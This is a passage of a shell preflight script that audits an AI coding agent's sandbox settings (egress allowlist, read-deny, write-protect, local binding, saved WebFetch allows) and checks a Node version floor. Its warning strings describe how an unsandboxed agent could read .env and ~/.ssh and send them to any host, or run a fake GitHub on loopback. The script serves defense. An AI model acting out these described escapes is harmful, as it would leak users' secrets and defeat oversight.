    case "$_eb_th" in *"$_bd_nl"*) _eb_th="" ;; esac
    if [ -n "$_eb_th" ]; then case " $_eb_ph " in *" $_eb_th "*) _eb_th="" ;; esac; fi   # SWAS-474 S3: already in the project list (an exact word match): listed once, there
  fi
  _eb_un=""
  if [ -z "${SANDBOX_RUNTIME:-}" ] && [ -f "$_buser" ]; then
    _eb_un=$(jq -r '.sandbox.network.allowedDomains | if type == "array" then length else 0 end' "$_buser" 2>/dev/null) || _eb_un=unreadable   # a COUNT, never a host
  fi
  _eb_blk=$(jq -cn '{sandbox: {network: {strictAllowlist: true, allowedDomains: []}}}') || _eb_blk=""   # MUT-BLOCK
  printf '%s\n' "  info egress: the user-level block to copy whole into $_bulabel (valid JSON, it carries no host):"
  if [ -n "$_eb_blk" ]; then printf '%s\n' "    $_eb_blk"; else printf '%s\n' "    (the block could not be built here: set sandbox.network.strictAllowlist to true at user scope)"; fi
  printf '%s\n' "  info egress: add the hosts below to any allowedDomains you already have; do not replace your list."
  case "$_eb_un" in
    ''|0) : ;;
    *[!0-9]*) printf '%s\n' "  info egress: your user-level allowedDomains could not be counted here; add to whatever it holds." ;;
    *) printf '%s\n' "  info egress: you already have $_eb_un host(s) in your user-level allowedDomains; add to them." ;;
  esac
  if [ "$_eb_pok" -eq 1 ]; then
    printf '%s\n' "  info egress: From this repo's .claude/settings.json; review each before you add it:"
    if [ -n "$_eb_ph" ]; then
      set -f; for _eb_h in $_eb_ph; do printf '%s\n' "      $_eb_h"; done; set +f   # the hosts passed the grammar above, so nothing here can glob
    else
      printf '%s\n' "      (no exact hosts listed there)"
    fi
    [ "$_eb_pd" -eq 0 ] || printf '%s\n' "  info egress: $_eb_pd entr(y/ies) in that file were not copied (not an exact host, repeated, or past the first 50)."
  else
    printf '%s\n' "  info egress: this repo's .claude/settings.json could not be read here; add the hosts you use to allowedDomains yourself."
  fi
  [ -z "$_eb_th" ] || printf '%s\n' "  info egress: From this repo's .kit/tracker.conf (your board); review before you add it:" "      $_eb_th"
  boundary_kit_group
}
# SWAS-1012: the hosts kit flows use, one "host|use" line each. Suggestions for a person to review (D-241023-2 item 4: no script writes a settings file). registry.npmjs.org only for a Node project.
boundary_kit_hosts() {
  printf '%s\n' "results-receiver.actions.githubusercontent.com|gh run view --log (CI logs)"
  if [ -f package.json ] || [ "${STACK:-}" = typescript-node ]; then   # MUT-EGR-NODE
    printf '%s\n' "registry.npmjs.org|npm install. A supply-chain host: with it allowed an agent's npm install fetches any package with no prompt (DECISIONS F8); add it only if you want unprompted installs"
  fi
}
boundary_kit_group() {  # the kit's hosts and their uses, names only (the user's own file is never read here)
  printf '%s\n' "  info egress: From the kit (hosts kit flows use); review each before you add it:"   # MUT-EGR-KIT
  boundary_kit_hosts | while IFS='|' read -r _kg_h _kg_u; do
    printf '%s\n' "      $_kg_h  ($_kg_u)"
  done
}
boundary_kit_missing() {  # <user settings file>: an info line per kit host the user's allowedDomains lacks. A jq boolean on each fixed kit name, so no user host is ever printed.
  [ -f "$1" ] || return 0
  boundary_kit_hosts | while IFS='|' read -r _km_h _km_u; do
    _km_in=$(jq -r --arg h "$_km_h" '.sandbox.network.allowedDomains | if type == "array" then any(.[]; . == $h) else false end' "$1" 2>/dev/null) || _km_in=unreadable
    if [ "$_km_in" = false ]; then printf '%s\n' "  info egress: your user-level allowedDomains lacks $_km_h, which kit flows use ($_km_u)"; fi   # MUT-EGR-MEMBER
  done
}
# boundary_summary (SWAS-474): the exit summary for a failed boundary. When egress is the failing part it leads with the strict step (the one act every adopter owes), then the declaration; when a
# non-egress part failed as well (or egress did not fail) the old sentence follows or stands alone, unchanged. A plain line, never counted. The exit stays at the call site.
boundary_summary() {
  _bsm_strict=""; _bsm_old=""; _bsm_l=${_bulabel:-}
  # shellcheck disable=SC2088  # a literal label printed to a person, never a path the shell opens
  [ -n "$_bsm_l" ] || _bsm_l='~/.claude/settings.json'
  if [ "${_bnd_egress_gap:-0}" -eq 1 ]; then
    _bsm_strict="Agent boundary: egress is not enforced. (1) The one act every adopter owes, once per machine: merge the block printed under the egress line above into $_bsm_l, then add the hosts you trust from the list there to sandbox.network.allowedDomains (they come from this repo; review each first). (2) Or, to opt out on purpose, declare it in .kit/boundary-optout.conf."
  fi
  if [ "${_bnd_egress_gap:-0}" -eq 0 ] || [ "${_bnd_nonegress:-0}" -eq 1 ]; then
    _bsm_old="Agent boundary: an UNDECLARED opt-out (or a malformed or UNTRUSTED declaration, or an unreadable declaration while a part is OFF) is listed above — declare it in .kit/boundary-optout.conf or remove the override (UNTRUSTED or UNVERIFIED: follow its Remedy)."
  fi
  _bsm_a=$_bsm_strict; _bsm_b=$_bsm_old   # MUT-SUMORDER
  [ -z "$_bsm_a" ] || printf '%s\n' "$_bsm_a"
  [ -z "$_bsm_b" ] || printf '%s\n' "$_bsm_b"
}
# boundary_webfetch_allows <local settings file> <enforced | open | session>: DC20 (Q20), the saved WebFetch(domain:) allows. One captured jq result or
# unreadable (a Linux jq prints a partial result and then fails). A host is printed only when it passes the exact-host grammar (lowercase labels, two or
# more, a letter in the last one), at most 10; every other entry is counted and never printed.
boundary_webfetch_allows() {
  [ -f "$1" ] || return 0
  _bw=$(jq -r '[.permissions.allow[]? | strings | select(startswith("WebFetch(domain:") and endswith(")")) | .[16:-1]] as $a
    | [$a[] | select(test("^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$") and test("[a-z][a-z0-9-]*$"))] as $h
    | "\($a | length) \($h | .[:10] | join(" "))"' "$1" 2>/dev/null) || _bw=unreadable   # MUT-DC20JQ
  case "$_bw" in   # MUT-DC20NL
    *"$_bd_nl"*) _bw=unreadable ;;
  esac
  _bwn=${_bw%% *}; _bwh=${_bw#* }
  case "$_bwn" in
    ''|*[!0-9]*) printf '%s\n' "  warn egress: .claude/settings.local.json could not be read for saved WebFetch(domain:) allows (UNVERIFIED)"; bunv=1; bwarn=$((${bwarn:-0} + 1)); return 0 ;;
    0) return 0 ;;
  esac
  _bwm=$2
  set -f; set -- $_bwh; set +f   # the hosts passed the grammar above, so nothing here can glob
  _bwk=$#; _bwx=""; [ "$_bwn" -le "$_bwk" ] || _bwx=" (and $((_bwn - _bwk)) more entries not printed)"
  case "$_bwm" in
    enforced) printf '%s\n' "  ok   egress: $_bwn saved WebFetch(domain:) allow(s) are overridden by user-scope strictAllowlist (C35, measured)" ;;
    session) printf '%s\n' "  warn egress: $_bwn saved WebFetch(domain:) allow(s) in .claude/settings.local.json admit these hosts with no prompt if strictAllowlist is not set at user scope: ${_bwh:-none printable}$_bwx"; bwarn=$((${bwarn:-0} + 1)) ;;
    *) printf '%s\n' "  warn egress: $_bwn saved WebFetch(domain:) allow(s) in .claude/settings.local.json admit these hosts with no prompt: ${_bwh:-none printable}$_bwx"; bwarn=$((${bwarn:-0} + 1)) ;;
  esac
}

boundary_has_tty() {  # rc 0 iff a terminal is attached (stdin, stdout or stderr). The seam PREFLIGHT_TTY_SEAM=1|0 is live ONLY under the selftest flag (SEAMS=1), where an unset seam reads "no TTY" so a selftest does not depend on where it is run; there is NO env override in a real run
  if [ "${SEAMS:-0}" -eq 1 ]; then [ "${PREFLIGHT_TTY_SEAM:-0}" = 1 ]; return $?; fi
  [ -t 0 ] || [ -t 1 ] || [ -t 2 ]   # S32: stderr counts too (`preflight </dev/null >log` from a terminal is not CI)
}

# boundary_local_bind (SWAS-945, D-241119-1): the local-bind line. A GRANT, so the polarity is the reverse of the three protections: it is judged when the effective allowLocalBinding is ON (_blbs), only
# while the sandbox is on, against a record of its own (the exact lookup: part=all never covers it). ON and undeclared FAILs; declared is a loud WARN; a user scope that cannot be read from the agent's shell is
# UNVERIFIED, never ON and never OFF. A value is never printed. Reads _bmode, _blbs and _bleg from check_boundary.
boundary_local_bind() {
  [ "$_bmode" = on ] || return 0
  case "$_blbs" in
    UNV)
      bunv=1; bwarn=$((${bwarn:-0} + 1))
      printf '%s\n' "  warn local-bind: UNVERIFIED (user scope not readable here) $_bleg — whether the agent may bind on a local address cannot be read from this shell; run 'sh scripts/preflight.sh' from a terminal to read it" ;;   # MUT-LBUNV
    ON)
      _blc="the agent's processes can bind on 0.0.0.0, so a server it starts is reachable from your LAN; its shell reaches every local listener (local proxies, browser debugging ports, local databases); and a script it writes can run a fake GitHub on loopback that a kit verb then talks to (the review label is a drift control, not authentication; branch protection still binds the merge)"
      _blf="the owner declares it in .kit/boundary-optout.conf (part=local-bind), or a person removes allowLocalBinding from .claude/settings.local.json"
      _bj_act=granted
      boundary_judge local-bind ON "" =local-bind "$_blc" "$_blf" "$_blc"
      _bj_act="opted out" ;;
  esac
}

check_boundary() {
  _bnd_egress_gap=0; _bnd_nonegress=0; _bpread=0   # SWAS-474: the summary's two kinds of bfail, and whether the project scope was readable (the egress block reads its allowedDomains only then)
  user_settings_scope
  _bfile=".claude/settings.json"; _bloc=".claude/settings.local.json"; _buser="$_us_path"; _bulabel="$_us_label"; _burel=$_us_rel; _bucfg=$_us_cfg
  case "$(uname -s 2>/dev/null)" in
    Darwin) _bmgd="/Library/Application Support/ClaudeCode/managed-settings.json" ;;
    *) _bmgd="/etc/claude-code/managed-settings.json" ;;
  esac
  if [ "${SEAMS:-0}" -eq 1 ]; then
    _bfile="${PREFLIGHT_SANDBOX_SETTINGS:-$_bfile}"; _bloc="${PREFLIGHT_SANDBOX_LOCAL:-$_bloc}"
    # shellcheck disable=SC2088  # a literal label printed to a person, never a path the shell opens
    if [ -n "${PREFLIGHT_SANDBOX_USER:-}" ]; then _burel=0; _bucfg=0; _bulabel="~/.claude/settings.json"; fi
    _buser="${PREFLIGHT_SANDBOX_USER:-$_buser}"; _bmgd="${PREFLIGHT_SANDBOX_MANAGED:-$_bmgd}"
  fi
  command -v jq >/dev/null 2>&1 || { echo "  skip boundary — jq absent"; bunv=1; return 0; }
  # The leg label says what was read. Under CI (CI or GITHUB_ACTIONS set AND no TTY attached, S25) only the committed project block is read: [declared].
  # CI set WITH a TTY is a human terminal (an rc export or an editor's terminal env must not switch the whole gate off): judged in full, with one WARN naming the condition.
  _bci=0; if [ -n "${CI:-}" ] || [ -n "${GITHUB_ACTIONS:-}" ]; then _bci=1; fi
  if [ "$_bci" -eq 1 ] && boundary_has_tty; then   # MUT-CITTY
    printf '%s\n' "  WARN boundary: CI is set in an interactive terminal; judged as a human terminal"
    bwarn=$((${bwarn:-0} + 1))
    printf '%s\n' "  Remedy: on a CI runner that allocates a TTY, run \`sh scripts/preflight.sh </dev/null 2>&1 | cat\` (CI runners only; this gives CI mode, which reads only the committed project block)"   # MUT-CIREMEDY
    _bci=0
  fi
  _bleg=static; _bcin=""; _bcip=""
  if [ "$_bci" -eq 1 ]; then _bleg=declared; _bcin="CI set: local and user scopes not read"; _bcip=" ($_bcin)"; fi
  [ -z "${SANDBOX_RUNTIME:-}" ] || _bleg="$_bleg, agent-reported"   # MUT-AGENTMARK
  _bleg="[$_bleg]"
  _beff=""; _bblock=""; _brt=0; _brh=0; _bwp=0; _bwu=0; _bst=0; _bstrepo=0; _bwf=0; _buserunv=0; _bax=0; _bau=0
  _blbv=""; _blbblock=""; _blbs=OFF   # SWAS-945: the effective allowLocalBinding (first scope that sets it, like enabled), the scope that blocked the read, and the state OFF | ON | UNV
  for _bn in managed local project user; do
    if [ "$_bci" -eq 1 ] && [ "$_bn" = local ]; then continue; fi   # MUT-CILOCAL
    if [ "$_bci" -eq 1 ] && { [ "$_bn" = user ] || [ "$_bn" = managed ]; }; then continue; fi   # MUT-CIUSER
    case "$_bn" in managed) _bf=$_bmgd ;; local) _bf=$_bloc ;; project) _bf=$_bfile ;; *) _bf=$_buser ;; esac
    _bs=$(boundary_read_scope "$_bf")
    if [ "$_bn" = user ] && [ -n "${SANDBOX_RUNTIME:-}" ]; then _bs=unreadable; fi   # MUT-INSESSION: in an agent session the user scope is read-denied, so it is not read
    if [ "$_bn" = user ] && [ "$_burel" -eq 1 ]; then _bs=unreadable; fi   # SWAS-1012: a relative CLAUDE_CONFIG_DIR is not guessed at: the user scope is not read
    case "$_bs" in
      absent) continue ;;
      unreadable)
        [ "$_bn" != user ] || _buserunv=1
        [ -n "$_beff" ] || [ -n "$_bblock" ] || _bblock=$_bn
        [ -n "$_blbv" ] || [ -n "$_blbblock" ] || _blbblock=$_bn
        continue ;;
    esac
    [ "$_bn" != project ] || _bpread=1
    _bv=$(printf '%s' "$_bs" | jq -r '[.e, .rt, .rh, .wp, .wu, .st, .wf, .ax, .au, .lb] | join(" ")')
    # shellcheck disable=SC2086  # deliberate word-split: ten plain words (a state word, eight booleans and the local-bind word)
    set -- $_bv
    if [ -z "$_blbv" ] && [ -z "$_blbblock" ] && [ "${10:-unset}" != unset ]; then _blbv=${10}; fi
    if [ -z "$_beff" ] && [ -z "$_bblock" ] && [ "$1" != unset ]; then _beff=$1; fi
    [ "$2" != true ] || _brt=1
    [ "$3" != true ] || _brh=1
    [ "$4" != true ] || _bwp=1
    [ "$5" != true ] || _bwu=1
    [ "$7" != true ] || _bwf=1
    [ "$8" != true ] || _bax=1
    [ "$9" != true ] || _bau=1
    if [ "$6" = true ]; then
      case "$_bn" in managed|user) _bst=1 ;; *) _bstrepo=1 ;; esac   # MUT-STRICT-SCOPE: a repo-file copy is ignored by Claude Code
    fi
  done
  # Part states, for the declaration (a part is OFF when it is not ON; egress is judged separately): _prd _pwr _peg are ON | OFF | UNV.
  _boff=""; _bevery=0; _begn=0; _bmode=""; _bwhy=""; _prd=OFF; _pwr=OFF; _peg=OFF
  case "$_beff" in
    true)
      # The settings enable the sandbox; if it cannot start here, Claude Code runs WITHOUT it (failIfUnavailable is false), so this is never ON.
      if [ "$_bci" -eq 0 ] && ! _bwhy=$(sandbox_unavailable_reason); then   # MUT-CANTSTART
        _bmode=nostart; _bevery=1
      else
        _bmode=on
        _brd=OFF; [ "$_brt" -eq 1 ] && [ "$_brh" -eq 1 ] && _brd=ON
        [ "$_bax" -eq 0 ] || _brd=SHADOWED
        _bwr=OFF; [ "$_bwp" -eq 1 ] && _bwr=PARTIAL; [ "$_bwp" -eq 1 ] && [ "$_bwu" -eq 1 ] && _bwr=ON
        [ "$_brd" != ON ] || _prd=ON
        [ "$_bwr" != ON ] || _pwr=ON
        [ "$_prd" = ON ] || _boff="$_boff read-deny"
        [ "$_pwr" = ON ] || _boff="$_boff write-protect"
        if [ "$_bst" -eq 1 ]; then _peg=ON; elif [ "$_bci" -eq 1 ] || [ "$_buserunv" -eq 1 ]; then _peg=UNV; else _begn=1; fi
      fi ;;
    false) _bmode=off; _bevery=1 ;;
    *) if [ -n "$_bblock" ]; then _bmode=unv; _prd=UNV; _pwr=UNV; _peg=UNV; else _bmode=nosandbox; _bevery=1; fi ;;
  esac
  [ "$_bau" -eq 0 ] || { _prd=OFF; _pwr=OFF; _peg=OFF; }
  if [ -n "$_blbv" ]; then   # SWAS-945: the effective allowLocalBinding; an unset key with an unreadable scope above or below it cannot be called OFF
    [ "$_blbv" != true ] || _blbs=ON
  elif [ -n "$_blbblock" ]; then
    _blbs=UNV
  fi
  # The declaration is read only when some part is not ON (an all-ON session makes no network call for it), by `--boundary-only` (the doctor leg,
  # which also judges STALE), and never under CI: a shallow CI checkout lacks the default branch tip, so the declared tier never gates on it.
  _bds=unread
  boundary_decl_gates() {  # rc 0 iff some boundary part is OFF and so needs the declaration (the ONE gate for an UNTRUSTED declaration; S20 may widen it here)
    [ -n "$_boff" ] || [ "$_bevery" -eq 1 ] || [ "$_begn" -eq 1 ] || [ "$_bau" -eq 1 ] || [ "$_blbs" = ON ]   # MUT-LBGATE: a grant that is ON needs the declaration too
  }
  if [ "$_bci" -eq 0 ] && { [ "$BOUNDARY_ONLY" -eq 1 ] || boundary_decl_gates; }; then
    boundary_decl_load
    _bds=$BD_STATE
    # the declaration was read from the last fetch while origin has moved: every line says so, and it is judged and gates exactly as usual
    if [ -n "$BD_MOVED" ]; then _bleg="${_bleg%]}, declared, last fetched $BD_MOVED; origin has moved]"; fi
    if [ "$_bds" = malformed ]; then
      case "$BD_WHY" in
        "line "*) _bsep=" " ;;
        *) _bsep=": " ;;
      esac
      printf '%s\n' "  FAIL boundary: declaration MALFORMED (.kit/boundary-optout.conf$_bsep$BD_WHY) $_bleg — no part counts as declared"
      bfail=1; _bnd_nonegress=1
    fi
    if [ "$_bds" = unreadable ] && boundary_decl_gates; then
      # S20 (owner ruling "355a: B revised"): with a part OFF, a declaration that could not be read FAILs from a terminal (it is the cheap way to switch the gate off),
      # unless --boundary-offline was typed on the command line (anyone can pass it: a visible act, not a control). --boundary-advisory and CI never move the exit (the same bfail); CI never reads the declaration at all.
      if [ "$BOUNDARY_OFFLINE" -eq 1 ]; then   # MUT-OFFLINE
        printf '%s\n' "  WARN boundary: declaration not verified (--boundary-offline typed on the command line; anyone can pass it: a visible act, not a control; the gate is not judged this run)"   # MUT-OFFLINELINE
        bwarn=$((${bwarn:-0} + 1))
        _bds=offline
        bunv=1   # S26: a plain preflight still exits 0 (the owner ruling), but doctor --boundary reads UNVERIFIED, never PASS   # MUT-OFFLINEUNV
      else
        _bgw="a part is OFF"   # SWAS-945: the gate is also a grant that is ON; the old wording stays whenever a part is OFF
        if [ "$_blbs" = ON ] && [ -z "$_boff" ] && [ "$_bevery" -eq 0 ] && [ "$_begn" -eq 0 ] && [ "$_bau" -eq 0 ]; then _bgw="a grant is ON"; fi
        printf '%s\n' "  FAIL boundary: declaration UNVERIFIED ($BD_WHY) while $_bgw. Remedy: $(boundary_unv_remedy)"
        bfail=1; _bnd_nonegress=1   # MUT-UNVGATE
      fi
    fi
    if [ "$_bds" = untrusted ]; then
      # D-241026-2: an integrity refusal fails like UNDECLARED (the same bfail: --boundary-advisory and CI never move the exit), with the remedy, but ONLY when
      # some part is OFF and so needs the declaration (I1): a fully ON user is told, not failed. boundary_decl_gates is the ONE gate condition.
      if boundary_decl_gates; then   # MUT-GATES
        printf '%s\n' "  FAIL boundary: declaration UNTRUSTED ($BD_WHY). Remedy: $BD_REMEDY"   # MUT-REMEDY
        bfail=1; _bnd_nonegress=1
      else
        printf '%s\n' "  info boundary: declaration UNTRUSTED ($BD_WHY); not judged (no part is off). Remedy: $BD_REMEDY"
      fi
    fi
  fi
  _bcons="an agent can read .env and ~/.ssh through an interpreter and send them to any host"
  _bfix="or remove the override that turns it off"
  case "$_bmode" in
    nostart)
      boundary_judge boundary OFF "cannot start: $_bwhy" @every "the settings enable the sandbox but it cannot start here, so the session runs unsandboxed: $_bcons" "declare it in .kit/boundary-optout.conf (part=all), $_bfix" "$_bcons" ;;
    off)
      boundary_judge boundary OFF "" @every "the agent OS sandbox is disabled in the highest scope that sets it: $_bcons" "declare it in .kit/boundary-optout.conf (part=all), $_bfix" "$_bcons" ;;
    nosandbox)
      boundary_judge boundary OFF "" @every "no scope enables the agent OS sandbox: $_bcons (where the default comes from: docs/operations/runtime-guards.md, \"The agent boundary: on by default\")" "declare it in .kit/boundary-optout.conf (part=all), $_bfix" "$_bcons" ;;
    unv)
      bunv=1; bwarn=$((${bwarn:-0} + 1))
      printf '%s\n' "  warn boundary: UNVERIFIED $_bleg — the $_bblock scope is unreadable here, so whether the sandbox is on cannot be read; run 'sh scripts/preflight.sh' from a terminal" ;;
    on)
      _bnote=""; [ "$_buserunv" -eq 0 ] || _bnote="; the user scope is unreadable here (read-denied to the agent's shell by design), so it is not counted"
      if [ "$_prd" = ON ] && [ "$_pwr" = ON ] && [ "$_bau" -eq 0 ]; then
        printf '%s\n' "  ok   boundary: ON $_bleg$_bcip — read-deny: ON, write-protect: ON (settings only; the probe, not this line, proves what the shell can do$_bnote)"
      else
        _bunsb=""; _bneed=$_boff
        if [ "$_bau" -ne 0 ]; then _bunsb=", allowUnsandboxedCommands is true in a scope (a command can opt out of the sandbox)"; _bneed="$_bneed @all"; fi
        _bfx=$(printf '%s' "$_boff" | sed 's/^ //; s/ /,/g'); [ "$_bau" -eq 0 ] || _bfx="all"
        boundary_judge boundary PARTIAL "" "$_bneed" "the sandbox is on but read-deny: $_brd, write-protect: $_bwr$_bunsb (SHADOWED means an allowRead names more than the two env templates). Where the default comes from: docs/operations/runtime-guards.md, \"The agent boundary: on by default\"" "declare it in .kit/boundary-optout.conf (part=$_bfx), $_bfix" "$_bcons"
      fi
      if [ "$_bucfg" -eq 1 ]; then   # MUT-CCD-INFO
        printf '%s\n' "  info boundary: the shipped write-protect names ~/.claude/settings.json, not $_bulabel, so that file is protected only if it lies outside the sandbox's write roots"
      fi
      if [ "$_bci" -eq 1 ]; then
        printf '%s\n' "  ok   egress: N/A $_bleg — CI runs no agent session; the user-level act is per machine"
      elif [ "$_bst" -eq 1 ]; then
        printf '%s\n' "  ok   egress: ENFORCED $_bleg — strictAllowlist is set at user or managed scope"
        if [ -z "${SANDBOX_RUNTIME:-}" ]; then boundary_user_hosts "$_buser"; boundary_kit_missing "$_buser"; fi
        boundary_webfetch_allows "$_bloc" enforced
      elif [ "$_buserunv" -eq 1 ]; then
        bunv=1; bwarn=$((${bwarn:-0} + 1))
        if [ "$_burel" -eq 1 ]; then
          printf '%s\n' "  warn egress: CLAUDE_CONFIG_DIR is not an absolute path, so the user scope was not read"
          bwarn=$((${bwarn:-0} + 1))
        fi
        printf '%s\n' "  warn egress: UNVERIFIED $_bleg — strictAllowlist belongs at user scope, which is unreadable here; run 'sh scripts/preflight.sh' from a terminal to read it"
        boundary_kit_group
        boundary_webfetch_allows "$_bloc" session
      else
        _bign=""; [ "$_bstrepo" -eq 0 ] || _bign=" (a strictAllowlist in a repo file is ignored by Claude Code, docs-stated)"
        boundary_judge egress "NOT ENFORCED" "" egress "strictAllowlist is not set at user or managed scope$_bign. Until it is, an unlisted host is a prompt a person can approve, and a mode that approves without a person (auto, bypass) lets it through" "(1) merge the user-level block into $_bulabel (the block is printed on the lines below, with the hosts to review, or why none could be listed; one human act per machine; it applies to every project on this machine; see docs/operations/runtime-guards.md); or (2) to opt out on purpose, commit part=egress to .kit/boundary-optout.conf (reviewed as control-plane)" "$_bcons"
        [ "$_bnd_egress_gap" -eq 0 ] || boundary_egress_block   # SWAS-474: only on the UNDECLARED path (a declared opt-out, an unread or unreadable declaration never sets the flag)
        boundary_webfetch_allows "$_bloc" open
      fi ;;
  esac
  boundary_local_bind
  if [ "$BOUNDARY_ONLY" -eq 1 ] && [ "$_bci" -eq 0 ]; then
    case "$_bds" in
      ok) boundary_stale ;;
      unreadable) printf '%s\n' "  info boundary: declaration not read ($BD_WHY); STALE not judged" ;;
    esac
  fi
  if [ "$_bwf" -eq 1 ]; then
    echo "  ok   web: WebFetch denied; read pages with sh scripts/fetch-text.sh <url>"   # MUT-WEBLINE
  fi
}

stack_tools() {  # print "tool|hint" lines for a stack; return 1 if unknown
  case "$1" in
    typescript-node) printf 'node|nodejs.org or nvm\nnpm|ships with Node\n' ;;
    python|ml|data-engineering) printf 'python3|python.org or pyenv\npip3|ships with Python\nuv|docs.astral.sh/uv\n' ;;
    go) printf 'go|go.dev/dl\n' ;;
    dotnet) printf 'dotnet|dotnet.microsoft.com/download\n' ;;
    rust) printf 'cargo|rustup.rs\n' ;;
    java-spring) printf 'java|adoptium.net\nmvn|maven.apache.org\n' ;;
    kotlin) printf 'java|adoptium.net\n' ;;
    terraform) printf 'terraform|developer.hashicorp.com/terraform/install\n' ;;
    *) return 1 ;;
  esac
}

# --- T5 (CP-7 K3/K5): the DECLARED runtime floor is ENFORCED, not merely declared ----------
# The typescript-node profile declares Node 24 in FIVE places (engines.node in both scaffolds,
# node-version: '24' in the emitted CI, scaffold/.nvmrc, scaffold/.node-version, the profile doc) and
# enforced it in NONE: preflight checked only that `node` EXISTS. A cold operator on Node 20.10 got a
# green "All prerequisites present.", `npm ci` then proceeded on an EBADENGINE *warning*, and the
# failure finally surfaced deep inside Rolldown as `node:util.styleText` — unreadable as a version
# problem. That truncated install went on to drop an optional native package (a second, separate
# finding). Enforcing the floor HERE, at the first thing anyone runs, retires both.
#
# POLICY (owner-ratified): HARD-FAIL WITH A NAMED ESCAPE.
#   below the floor  -> REFUSE (non-zero), naming the running version, the required floor, AND
#                       --allow-runtime-mismatch in the same message (never make the reader search).
#   with that flag   -> proceed, but WARN loudly and SUPPRESS the clean green — a suppressed refusal
#                       must never read as a pass. It exits 0 by design: the operator asked to proceed.
#   floor unreadable -> WARN with the reason. Fail-safe toward disclosure; never a silent skip and
#                       never a version-verified green we did not earn.
# Warn-and-continue is precisely what produced the defect; a bare hard-fail would strand an adopter on
# an unusual-yet-working runtime. Signpost the escape, don't relax the rule.
#
# SINGLE SOURCE: the floor is READ from profiles/<stack>/scaffold/.nvmrc — the declaration that already
# exists. This adds no sixth declaration, so the floor cannot drift away from the profile.
RUNTIME_REFUSE=0   # armed when the running runtime is below the floor and no escape was passed
RUNTIME_WAIVED=0   # armed when that refusal was waived by --allow-runtime-mismatch
RUNTIME_FOUND=""   # the running version line, as reported (e.g. v20.20.2)
RUNTIME_FLOOR=""   # the required MAJOR, as declared (e.g. 24)
RUNTIME_SRC=""     # where the floor was read from

node_major() {  # <version line> -> MAJOR on stdout; rc 1 when unparseable
  # Accepts every real shape: "v24.18.0" (node --version), "24" (.nvmrc), "v24.4.0" (.nvmrc), "20.10.0".
  # `set -f` around the split, for the same reason git_version_parts needs it: unquoted $1 word-splits
  # (which we WANT) *and* pathname-expands (which we do not). A '*' in the line would glob against the
  # CWD, so a file named '99.9.9' would BE the running version — a floor reading the filesystem instead
  # of the runtime, and here that would SILENCE a real refusal. No `return` inside the window.
  _tok=""
  set -f
  for _w in $1; do
    case "$_w" in
      v[0-9]*) _tok=${_w#v}; break ;;
      [0-9]*)  _tok=$_w;     break ;;
    esac
  done
  set +f
  [ -n "$_tok" ] || return 1
  _nmaj=${_tok%%.*}
  _nmaj=${_nmaj%%[!0-9]*}   # tolerate a pre-release tail (24-nightly -> 24)
  case "$_nmaj" in ''|*[!0-9]*) return 1 ;; esac
  printf '%s\n' "$_nmaj"
}

read_runtime_floor() {  # <.nvmrc path> -> floor MAJOR on stdout; rc 1 when absent/unreadable/unparseable
  # All three failure modes are rc 1 and the CALLER warns with the reason — a moving alias ("lts/iron")
  # must never be turned into an invented number, and an absent file must never read as "verified".
  [ -f "$1" ] && [ -r "$1" ] || return 1
  _fl=""
  while IFS= read -r _fline || [ -n "$_fline" ]; do
    case "$_fline" in ''|'#'*) continue ;; esac
    _fl=$_fline; break
  done < "$1"
  [ -n "$_fl" ] || return 1
  node_major "$_fl"
}

runtime_floor_applies() {  # <stack> -> 0 iff this stack RUNS on node (so .nvmrc is its floor)
  # PER-STACK, NEVER GLOBAL: go/python/rust have no .nvmrc and must be completely unaffected. The
  # discriminator is the stack's own tool map, which is why an absent .nvmrc can be a silent N/A for a
  # non-Node stack and an UNVERIFIED warning for a Node one (where the floor is expected to exist).
  stack_tools "$1" 2>/dev/null | grep -q '^node|'
}

check_runtime_floor() {  # <stack> <.nvmrc path> — prints one report line; may arm the refusal/waiver
  runtime_floor_applies "$1" || return 0
  RUNTIME_SRC=$2
  # FLAG-NOT-ENV: the seam is honored only when a seam flag was passed (--selftest/--selftest-e2e).
  # Load-bearing here in a way it is not for the advisory git floor: this check BLOCKS, so an ambient
  # export that could tell it "you are on Node 24" would turn a refusal into a pass.
  _rtcmd="node --version"
  [ "${SEAMS:-0}" -eq 1 ] && _rtcmd="${PREFLIGHT_NODE_VERSION_CMD:-node --version}"
  # shellcheck disable=SC2086  # deliberate word-split: the seam supplies a command line, not one word
  _rtline=$(${_rtcmd} 2>/dev/null) || _rtline=""
  if [ -z "$_rtline" ]; then
    echo "  warn node runtime floor UNVERIFIED — could not run 'node --version'"
    rec=$((rec + 1)); return 0
  fi
  if ! _rtmaj=$(node_major "$_rtline"); then
    printf '%s\n' "  warn node runtime floor UNVERIFIED — unrecognised version string: $_rtline"   # Rule 3
    rec=$((rec + 1)); return 0
  fi
  if ! _rtfloor=$(read_runtime_floor "$RUNTIME_SRC"); then
    printf '%s\n' "  warn node runtime floor UNVERIFIED — $RUNTIME_SRC is missing, unreadable, or not a version"
    printf '%s\n' "       (running node $_rtline; nothing here has verified it against the profile's floor)"
    rec=$((rec + 1)); return 0
  fi
  RUNTIME_FOUND=$_rtline; RUNTIME_FLOOR=$_rtfloor
  # NUMERIC compare, deliberately — the git floor's lesson, one stack over: lexically "9" > "24", so a
  # string-naive compare would wave Node 9 through a Node 24 floor and be decorative.
  if [ "$_rtmaj" -ge "$_rtfloor" ]; then
    printf '%s\n' "  ok   node $_rtline meets the Node $_rtfloor floor (declared in $RUNTIME_SRC)"   # Rule 3
    return 0
  fi
  if [ "$ALLOW_RUNTIME_MISMATCH" -eq 1 ]; then
    RUNTIME_WAIVED=1
    printf '%s\n' "  WARN node $_rtline is BELOW the required Node $_rtfloor floor ($RUNTIME_SRC)."
    echo "       Proceeding ONLY because --allow-runtime-mismatch was passed. This is an UNSUPPORTED"
    echo "       runtime: 'npm ci' will refuse it (engine-strict), and whatever does install can fail"
    echo "       deep inside a dependency in ways that do not look like a version problem."
    return 0
  fi
  RUNTIME_REFUSE=1
  printf '%s\n' "  MISS node $_rtline is below the required Node $_rtfloor floor — see the error below"   # Rule 3
}

is_github_repo() {  # 0 iff inside a work tree whose origin is a github.com remote
  git rev-parse --is-inside-work-tree >/dev/null 2>&1 || return 1
  _origin=$(git remote get-url origin 2>/dev/null) || return 1
  case "$_origin" in *github.com*) return 0 ;; *) return 1 ;; esac
}

# --- CP-4: repository ownership is a hard precondition -------------------------------------
# `git rev-parse --is-inside-work-tree` answers "is there a repo ABOVE me?" — not "is THIS dir the
# root of its own repo?". The two diverge only when nested, which is why every non-nested test
